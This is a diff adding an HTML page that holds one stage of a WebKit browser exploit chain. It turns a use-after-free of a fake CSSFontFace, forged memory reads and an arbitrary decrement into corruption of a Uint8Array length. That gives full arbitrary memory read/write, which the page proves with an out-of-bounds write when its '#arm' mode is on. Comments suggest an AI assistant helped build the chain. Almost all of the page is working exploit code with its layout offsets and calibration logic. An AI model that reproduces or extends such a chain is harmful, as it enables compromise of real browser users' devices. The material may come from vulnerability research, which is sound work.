@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1329 VIEWCELL-ADDROF + LEN-UNDERFLOW</title>
+<style>
+:root{--bg:#070a0f;--panel:#111722;--line:#1e2838;--txt:#cfe0f2;--dim:#6b7c94;--green:#39d98a;--red:#ff5d6c;--mag:#ff6fd0}
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{background:var(--bg);color:var(--txt);font:13px/1.5 ui-monospace,Menlo,Consolas,monospace}
+#bn{position:fixed;top:0;left:0;right:0;z-index:99;font:800 15px/1.3 ui-monospace,monospace;padding:13px 12px;text-align:center;color:#fff;background:#1b2330;border-bottom:3px solid #2a3647}
+#log{margin:58px 10px 10px;padding:10px;background:var(--panel);border:1px solid var(--line);border-radius:8px}
+.r{padding:2px 5px;white-space:pre-wrap;word-break:break-all;border-left:3px solid transparent}
+.r .t{color:#53d0e8;font-weight:700}.r .n{color:var(--dim)}
+.r.ok{border-left-color:var(--green)}.r.ok .t{color:var(--green)}
+.r.bad{border-left-color:var(--red)}.r.bad .t{color:var(--red)}
+.r.win{border-left-color:var(--mag);background:#1e0f1b}.r.win .t{color:var(--mag);font-weight:800}
+</style></head>
+<body>
+<div id="bn">P1329 - view-cell addrOf via wrapper expando -> m_length underflow. Fresh-open each try.</div>
+<div id="log"></div>
+<script>
+'use strict';
+/* ===================================================================
+   P1329  WEAPONIZE THE DECREMENT -> CONTROL A MARKEDSPACE VIEW CELL
+   CRASH_CLASS: HIGH (safe mode MODERATE)
+
+   Chain state going in (all confirmed on 14.10):
+     - reclaim: dangling fake CSSFontFace lives in our Uint8Array `buf`
+       (P1322/P1324/P1327).  Residual leaks: L1=*(buf+0x58)=m_clients,
+       L2=*(buf+0x68) = the live JSFontFace WRAPPER CELL (MarkedSpace;
+       p1305 reads +0=structureID,+8=butterfly,+0x10=m_wrapped).
+     - full arbitrary READ of readable memory: the CSSFontFace
+       style-serialization forge-read (forgeRead+face.style+dec),
+       self-calibrated with `self` = addr(buf) from the P1324 oracle scan.
+     - arbitrary-address 32-bit DECREMENT, -2/call (P1310): plant
+       buf+0x18 = X, each `W.family=` runs CSSValue::deref() twice on X.
+     - Gigacage OFF (P1328): a view's m_vector is used verbatim.
+
+   THE IDEA (answers task Q2 "typed-array m_length OOB", ranked #1):
+     We already hold a live MarkedSpace JSCell addr -- the FontFace
+     wrapper W (cell @ L2). W is an ordinary extensible JSObject, so an
+     EXPANDO `W.__spy = victimView` stores the victim Uint8Array's CELL
+     pointer in W's property storage (inline slot or butterfly). We READ
+     that slot (full read) -> addrOf of a live Uint8Array VIEW CELL `VC`.
+     That is the missing primitive: control of a MarkedSpace view cell.
+
+     Then weaponize the DECREMENT on a NON-refcount field:
+        X = VC + 0x1C   (high 32 bits of the size_t m_length @ VC+0x18)
+     One `W.family=` call: *(u32*)(VC+0x1C): 0 -> 0xFFFFFFFE, so
+        m_length = 0xFFFFFFFE_000000C0   (~1.8e19 elements)
+     The view keeps its AUTHENTIC header (no StructureID forge, no header
+     clone, no fakeobj) -- only the cached length is corrupted. Bounds
+     check `index < m_length` now passes for ~the whole address space
+     above m_vector => victimView[i] is OOB read/write => arbitrary R/W.
+
+   Layout used (upstream WebKit_1400-era, calibrated):
+     JSArrayBufferView(Uint8Array, Wasteful): +0 structureID(u32)
+       +4 indexingType +5 JSType(Uint8Array=0x32) +6 flags +7 cellState
+       +8 butterfly  +0x10 m_vector  +0x18 m_length(size_t)
+       +0x1C m_length HIGH dword (UNDERFLOW TARGET)  +0x20 m_byteOffset
+       +0x28 m_mode (WastefulTypedArray=0x58).  sizeof 0x30.
+     JSFontFace wrapper: +0 structureID +8 butterfly +0x10 m_wrapped.
+
+   MODES:
+     default  = SAFE. Stop after VIEWCELL + VC-JSTYPE verification
+                (non-destructive addrOf proof).
+     #arm     = perform the single -2 decrement on VC+0x1C and read back
+                m_length (MLEN-POST) + an OOB write/read proof (OOB-OK).
+
+   DECISIVE MARKERS (beacon):
+     VIEWCELL-0x....         first live MarkedSpace typed-array view cell addr
+     VC-JSTYPE-0x32-...      verified authentic Uint8Array header (the WIN)
+     MLEN-POST-0x...         (#arm) length after underflow
+     OOB-OK / OOB-MISS       (#arm) terminal arbitrary-R/W proof
+   =================================================================== */
+var LOG=document.getElementById('log'),BN=document.getElementById('bn'),_c=0;
+function S(x,col){BN.textContent=x;BN.style.background=col||'#1b2330';}
+function kls(s){s=(''+s).toLowerCase();if(/viewcell-0x|jstype-0x32|oob-ok|win|cage-off/.test(s))return'win';if(/hit|ok|dangling|done|anchor|addr|self|read-ok/.test(s))return'ok';if(/err|miss|fail|crash|no-|none|collide|noaddr|noleak|dead|throw|underflow-skip/.test(s))return'bad';return'';}
+function row(t,d,c){_c++;var r=document.createElement('div');r.className='r '+(c||'');r.innerHTML="<span class='n'>"+_c+"</span> <span class='t'>"+(''+t).replace(/[<>&]/g,'')+"</span>"+(d?" <span>"+(''+d).replace(/[<>&]/g,'')+"</span>":"");LOG.appendChild(r);while(LOG.childNodes.length>30)LOG.removeChild(LOG.firstChild);}
+function B(tag,data){row(tag,data,kls(tag+' '+(data||'')));try{var s=(''+(data||'')).replace(/[^A-Za-z0-9._-]/g,'_').slice(0,300);var u='/beacon.php?tag=P1329-'+encodeURIComponent(tag);if(data)u+='&data='+encodeURIComponent(s);u+='&t='+Date.now();var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);}catch(e){}}
+window.onerror=function(m,s,l){B('ERR',(''+m).slice(0,70)+'@'+l);};
+B('VER','1');
+
+function le(u,o){var x=0n;for(var q=7;q>=0;q--)x=(x<<8n)|BigInt(u[o+q]);return x;}
+function le32(u,o){return Number(le(u,o)&0xFFFFFFFFn);}
+function wq(u,o,v){for(var i=0;i<8;i++){u[o+i]=Number(v&0xFFn);v>>=8n;}}
+function wd(u,o,v){for(var i=0;i<4;i++){u[o+i]=(v>>>(8*i))&0xFF;}}
+var heapLo=0x1000000000n, heapHi=0x1100000000n;
+
+var buf=null,L1=null,L2=null,W=null,K=32,fired=false,sp=[],fs=null;
+var FAM='zq7k3mx',MARK=0x6000,SELFMARK=0x6100,TGT_IDX=31,SELF_IDX=30;
+var ARMED=(location.hash.indexOf('arm')>=0);
+
+/* ---- reclaim machinery (verbatim P1327), + a self-marker on sp[SELF_IDX] ---- */
+try{var vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});document.fonts.add(vf);void vf.loaded;
+ fs=document.createElement('style');fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';document.head.appendChild(fs);}catch(e){B('SETUP-ERR',(''+e).slice(0,40));}
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+ if(fired)return undefined;fired=true;
+ try{if(fs){fs.textContent='';fs.remove();}}catch(e){}try{document.fonts.delete(this);}catch(e){}fs=null;try{document.body.offsetHeight;}catch(e){}
+ for(var k=0;k<K;k++){var w=new Uint8Array(new ArrayBuffer(192));w[0x82]=3;w[3]=0x80;var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;
+   if(k===TGT_IDX){w[0x30]=0x00;w[0x31]=0x60;w[0x34]=0x00;w[0x35]=0x60;}          /* MARK  0x6000 : known scratch buffer A0 */
+   if(k===SELF_IDX){w[0x30]=0x00;w[0x31]=0x61;w[0x34]=0x00;w[0x35]=0x61;}          /* SELFMARK 0x6100 : locate sp[SELF_IDX] */
+   sp.push(w);}
+ return undefined;},set:function(){}});
+try{document.fonts.load('1em vf, v1','AB').then(function(f){window.__lf=f;setTimeout(scan,80);},function(){setTimeout(scan,80);});}catch(e){B('LOAD-ERR',(''+e).slice(0,40));}
+setTimeout(function(){if(!buf)scan();},450);
+
+function scan(){
+ if(buf)return;var hit=-1;
+ for(var i=0;i<sp.length;i++){var a=le(sp[i],0x58);if(a>heapLo&&a<0x8000000000n){L1=a;L2=le(sp[i],0x68);buf=sp[i];hit=i;break;}}
+ if(hit<0){B('MISS','CLOSE+REOPEN');S('miss - fresh-open','#4a2a12');return;}
+ if(hit===TGT_IDX||hit===SELF_IDX){B('TGT-COLLIDE','dangling==marker idx - fresh-open');S('collide - fresh-open','#4a2a12');return;}
+ if(L2===0n||!(L2>heapLo&&L2<heapHi)){B('NOLEAK','L2=0x'+(L2?L2.toString(16):'0')+' - fresh-open');S('no L2 wrapper - fresh-open','#4a2a12');return;}
+ B('HIT','L1=0x'+L1.toString(16)+' L2(wrapperCell)=0x'+L2.toString(16)+' dIdx='+hit);
+ var cands=[];if(window.__lf)for(var i=0;i<window.__lf.length;i++)cands.push(window.__lf[i]);
+ buf[0x82]=4;for(var i=0;i<cands.length;i++){var st='';try{st=''+cands[i].status;}catch(e){}if(st==='error'){W=cands[i];break;}}
+ buf[0x82]=3;
+ if(!W){B('NOT-DANGLE','fresh-open');S('not dangling - fresh-open','#4a2a12');return;}
+ B('DANGLING-OK',ARMED?'ARMED (#arm) - will underflow m_length':'SAFE mode (add #arm for the OOB finisher)');
+ S('dangling - locating self + view cell','#0c7a3a');setTimeout(go,100);
+}
+function chk(cp){try{return document.fonts.check('16px "'+FAM+'"',String.fromCodePoint(cp))?'T':'F';}catch(e){return 'E';}}
+
+/* ---- the self-calibrated style forge-read (verbatim mechanism from p1294/p1305) ----
+   Forges buf as {fake MutableStyleProperties@self+0x70 -> fake CSSValue ->
+   fake StringImpl(data=daddr,len=dlen,8-bit)} so faces style-serialization
+   emits the dlen bytes at daddr. Requires `self` = addr(buf). ~128 bytes/read. */
+var self=0n;
+function forgeRead(daddr,dlen){
+ for(var ib=0;ib<sp.length;ib++){var vb=sp[ib];if(!vb)continue;
+   wq(vb,0x08,self+0x70n);vb[0x10]=0;
+   wd(vb,0x30,4);wd(vb,0x34,dlen);wq(vb,0x38,daddr);wd(vb,0x40,4);
+   vb[0x44]=0x7A;vb[0x45]=0x7A;vb[0x46]=0x71;
+   wd(vb,0x70,4);wd(vb,0x74,0x10);vb[0x78]=14;vb[0x79]=0;wq(vb,0x7A,self+0x90n);
+   wd(vb,0x90,3);wd(vb,0x94,72);wq(vb,0x98,self+0x30n);
+ }
+}
+function dec(s,lim){var by=[],q=(s.charAt(0)==='"')?1:0,e=(s.slice(-1)==='"')?s.length-1:s.length,k=q;
+ while(k<e&&by.length<lim){var ch=s.charAt(k);
+   if(ch==='\\'){k++;var hh='';while(k<e&&hh.length<6&&/[0-9a-fA-F]/.test(s.charAt(k))){hh+=s.charAt(k);k++;}
+     if(hh.length===0){if(k<e){by.push(s.charCodeAt(k));k++;}}
+     else{if(s.charAt(k)===' ')k++;var cp=parseInt(hh,16);if(cp>255)cp&=0xFF;by.push(cp);}}
+   else{by.push(s.charCodeAt(k));k++;}}
+ var h='';for(var j=0;j<by.length;j++)h+=('0'+by[j].toString(16)).slice(-2);return h;}
+function snapAll(){var m=[];for(var i=0;i<sp.length;i++){var c=new Uint8Array(192);for(var j=0;j<192;j++)c[j]=sp[i][j];m.push(c);}return m;}
+function restoreAll(snap){for(var i=0;i<sp.length;i++){for(var j=0;j<192;j++)sp[i][j]=snap[i][j];}}
+var SAFE_SNAP=null;
+function rdH(daddr,n){ /* full read: returns hex string of n bytes at daddr, '' on throw */
+ if(SAFE_SNAP)restoreAll(SAFE_SNAP);
+ forgeRead(daddr,n);
+ var out='';try{out=dec(String(W.style),n);}catch(e){out='';}
+ if(SAFE_SNAP)restoreAll(SAFE_SNAP);
+ return out;}
+function qAt(h,bo){var o=bo*2;if(o+16>h.length)return 0n;return BigInt('0x'+h.slice(o,o+16).match(/../g).reverse().join(''));}
+function bAt(h,bo){var o=bo*2;if(o+2>h.length)return -1;return parseInt(h.slice(o,o+2),16);}
+
+function go(){
+ if(window.__g)return;window.__g=true;
+ for(var i=0x58;i<0x68;i++)buf[i]=0; wq(buf,0x08,L1); buf[0x10]=0;
+ /* make W matchable so family/unicodeRange setters survive + oracle works (P1324) */
+ try{ W.family=FAM; }catch(e){ B('SETFAM-ERR',(''+(e&&e.message||e)).slice(0,40)); S('setFamily crashed','#4a2a12'); return; }
+ try{ document.fonts.add(W); }catch(e){}
+ buf[0x82]=1;
+ var ur='U+100-101';for(var i=1;i<24;i++){var a=0x200+i*2;ur+=',U+'+a.toString(16)+'-'+(a+1).toString(16);}
+ var U=0n;try{ W.unicodeRange=ur; U=le(buf,0x20); B('ANCHOR','U=0x'+U.toString(16)); }catch(e){ B('UR-ERR',(''+(e&&e.message||e)).slice(0,40)); }
+ wd(buf,0x20,0);wd(buf,0x24,0);wd(buf,0x28,0);wd(buf,0x2C,0);var rA=chk(0x41);
+ wq(buf,0x20,L1);wd(buf,0x28,0x80000001);wd(buf,0x2C,1);var rB=chk(0x41);
+ B('ORACLE','empty='+rA+' high='+rB);
+ if(!(rA==='F'&&rB==='T')){B('ORA-NO-MATCH','cannot scan');S('oracle dead - fresh-open','#4a2a12');return;}
+ if(U===0n){B('NO-ANCHOR','');return;}
+
+ /* --- locate `self` = addr(buf) via the SELFMARK on sp[SELF_IDX], then by scanning for
+        the dangling buf's own residual. We instead find sp[SELF_IDX] (known marker) which
+        is same-run adjacent, then walk to buf via the stable K-stride (fallback: scan). --- */
+ /* Simpler + robust: scan the window for the dangling buf itself by planting a transient
+    marker in it and reading it back through the oracle. buf is matchable; its +0x30 marker
+    region is free right now. */
+ var MK=0x62;buf[0x30]=0x00;buf[0x31]=MK;buf[0x34]=0x00;buf[0x35]=MK;var MKcp=MK<<8;
+ var selfA=0n;
+ for(var X=U-0x1000n; X<U+0x1000n; X+=0x10n){
+   wq(buf,0x20,X+0x30n);wd(buf,0x28,0x80000001);wd(buf,0x2C,1);
+   if(chk(MKcp)==='F'&&chk(MKcp+1)==='T'){ selfA=X; break; }
+ }
+ buf[0x30]=0;buf[0x31]=0;buf[0x34]=0;buf[0x35]=0;
+ if(selfA===0n){ B('NOSELF','buf marker not near U - widen/fresh-open'); S('no self - fresh-open','#4a2a12'); return; }
+ self=selfA; B('SELF','self(buf)=0x'+self.toString(16));
+
+ /* snapshot the safe (matchable) buffer shape so rdH can restore between reads */
+ wd(buf,0x20,0);wd(buf,0x24,0);wd(buf,0x28,0);wd(buf,0x2C,0);buf[0x82]=1;
+ SAFE_SNAP=snapAll();
+
+ /* --- validate the full read + confirm L2 is the wrapper cell --- */
+ try{document.fonts.delete(W);}catch(e){}   /* face.style getter works out-of-set; avoids layout touching buf mid-forge */
+ var wh=rdH(L2,0x40);
+ if(wh.length<0x40){ B('READ-DEAD','forge-read returned '+wh.length+'B - calibration/fresh-open'); S('read dead - fresh-open','#4a2a12'); return; }
+ var l2sid=qAt(wh,0), l2but=qAt(wh,8), l2wrapped=qAt(wh,0x10);
+ var l2jsType=bAt(wh,5);
+ B('READ-OK','L2 sid=0x'+(l2sid&0xFFFFFFFFn).toString(16)+' jsType=0x'+l2jsType.toString(16)+' but=0x'+l2but.toString(16)+' wrapped=0x'+l2wrapped.toString(16));
+ if(l2jsType<0x21){ B('L2-NOT-OBJ','jsType=0x'+l2jsType.toString(16)+' (expected >=0x21 object) - L2 may be WeakImpl not cell; fresh-open'); }
+
+ /* --- THE NEW STEP: expando on the wrapper -> view-cell addrOf --- */
+ var VIC=new Uint8Array(new ArrayBuffer(0x40));   /* WastefulTypedArray Uint8Array, len 0x40 */
+ window.__vic=VIC;
+ try{ W.__spy=VIC; }catch(e){ B('EXPANDO-ERR',(''+(e&&e.message||e)).slice(0,40)); }
+ /* re-read the wrapper (expando may have reshaped butterfly) */
+ wh=rdH(L2,0x40); l2but=qAt(wh,8);
+ var cset=[qAt(wh,0x18),qAt(wh,0x20),qAt(wh,0x28),qAt(wh,0x30),qAt(wh,0x38)]; /* inline slot candidates */
+ if(l2but>heapLo&&l2but<heapHi){
+   var bwin=rdH(l2but-0x20n,0x40);
+   for(var bo=0;bo<0x40;bo+=8){var cv=qAt(bwin,bo);if(cv>heapLo&&cv<heapHi)cset.push(cv);}
+ }
+ B('EXPANDO','but=0x'+l2but.toString(16)+' cands='+cset.length);
+
+ /* --- verify each candidate is a live Uint8Array VIEW cell (authentic JSType 0x32) --- */
+ var VC=0n,mvec=0n,mlen=0n,mmode=-1,mhi=-1;
+ for(var ci=0;ci<cset.length;ci++){
+   var C=cset[ci];if(!(C>heapLo&&C<heapHi))continue;
+   var ch=rdH(C,0x30);if(ch.length<0x30)continue;
+   var jt=bAt(ch,5);
+   if(jt===0x32){ VC=C;mvec=qAt(ch,0x10);mlen=qAt(ch,0x18);mmode=bAt(ch,0x28);mhi=Number((mlen>>32n)&0xFFFFFFFFn);break; }
+ }
+ if(SAFE_SNAP)restoreAll(SAFE_SNAP);
+ if(VC===0n){ B('VIEWCELL-NONE','no Uint8Array (jsType 0x32) among '+cset.length+' expando slots - re-check layout/fresh-open'); S('no view cell - tell AI','#4a2a12');
+   try{document.fonts.add(W);}catch(e){} return; }
+ B('VIEWCELL','0x'+VC.toString(16));
+ B('VC-JSTYPE-0x32-UINT8ARRAY','mvec=0x'+mvec.toString(16)+' mlen=0x'+mlen.toString(16)+' hi=0x'+mhi.toString(16)+' mode=0x'+mmode.toString(16));
+ S('VIEW CELL addrOf OK (JSType 0x32) !!!','#0a7a2a');
+
+ if(!ARMED){ B('SAFE-DONE','addrOf of a controllable MarkedSpace view cell proven. Add #arm for m_length underflow + OOB.'); try{document.fonts.add(W);}catch(e){} return; }
+
+ /* ======================= ARMED: m_length high-dword underflow ======================= */
+ if(mhi!==0){ B('UNDERFLOW-SKIP','VC+0x1C=0x'+mhi.toString(16)+' not 0 - a -2 would not clean-underflow'); try{document.fonts.add(W);}catch(e){} return; }
+ var Xdec=VC+0x1Cn;
+ /* switch buf from read-forge shape to decrement shape (P1310): m_family(0x18)=Xdec */
+ if(SAFE_SNAP)restoreAll(SAFE_SNAP);
+ for(var i=0x58;i<0x68;i++)buf[i]=0; wq(buf,0x08,L1); buf[0x10]=0; wq(buf,0x18,Xdec); buf[0x82]=3;
+ try{ document.fonts.add(W); }catch(e){}
+ try{ W.family='zz'; B('DEC','fired -2 at VC+0x1C=0x'+Xdec.toString(16)); }   /* 0 -> 0xFFFFFFFE */
+ catch(e){ B('DEC-ERR',(''+(e&&e.message||e)).slice(0,40)); }
+ /* read back m_length */
+ for(var i=0x58;i<0x68;i++)buf[i]=0; wq(buf,0x08,self+0x70n); buf[0x10]=0; buf[0x82]=1; SAFE_SNAP=snapAll();
+ try{document.fonts.delete(W);}catch(e){}
+ var post=rdH(VC+0x18n,8); var pmlen=qAt(post,0);
+ B('MLEN-POST','0x'+pmlen.toString(16)+' (pre=0x'+mlen.toString(16)+')');
+ if(SAFE_SNAP)restoreAll(SAFE_SNAP);
+
+ /* OOB proof: write a sentinel through VIC past its real end into sp[TGT_IDX] (addr A0), read A0 back.
+    Find A0 (TGT buffer) via its 0x6000 marker, compute idx = A0 - mvec. */
+ var A0=0n;
+ for(var X=U-0x1000n; X<U+0x1000n; X+=0x10n){
+   wq(buf,0x20,X+0x30n);wd(buf,0x28,0x80000001);wd(buf,0x2C,1);
+   if(chk(MARK)==='F'&&chk(MARK+1)==='T'){ A0=X; break; }
+ }
+ if(SAFE_SNAP)restoreAll(SAFE_SNAP);
+ if(A0===0n||pmlen<0x100000000n){ B('OOB-SKIP','A0=0x'+A0.toString(16)+' pmlen=0x'+pmlen.toString(16)); try{document.fonts.add(W);}catch(e){} return; }
+ var idxB=A0-mvec;                         /* byte offset from view base to A0 */
+ if(idxB<0n||idxB>0x4000000n){ B('OOB-RANGE','A0 not above mvec within 64MB: idx=0x'+idxB.toString(16)); try{document.fonts.add(W);}catch(e){} return; }
+ var idx=Number(idxB)+0x40;                /* land inside A0 at +0x40 (clear of its marker) */
+ var ok=false;try{ VIC[idx]=0xAB; VIC[idx+1]=0xCD; ok=true; }catch(e){ B('OOB-WRITE-ERR',(''+(e&&e.message||e)).slice(0,40)); }
+ if(ok){
+   var rb=rdH(A0+0x40n,2); if(SAFE_SNAP)restoreAll(SAFE_SNAP);
+   var b0=bAt(rb,0),b1=bAt(rb,1);
+   if(b0===0xAB&&b1===0xCD){ B('OOB-OK','VIC[OOB idx 0x'+idx.toString(16)+'] wrote 0xABCD into A0+0x40 -> read-back 0x'+b0.toString(16)+b1.toString(16)+' == FULL ARBITRARY R/W'); S('OOB-OK !!! arbitrary R/W','#0a7a2a'); }
+   else { B('OOB-MISS','read-back 0x'+(b0>=0?b0.toString(16):'?')+(b1>=0?b1.toString(16):'?')+' (expected abcd) - idx/mvec calibration'); }
+ }
+ try{document.fonts.add(W);}catch(e){}
+ B('DONE','armed path complete');
+}
+</script>
+</body></html>
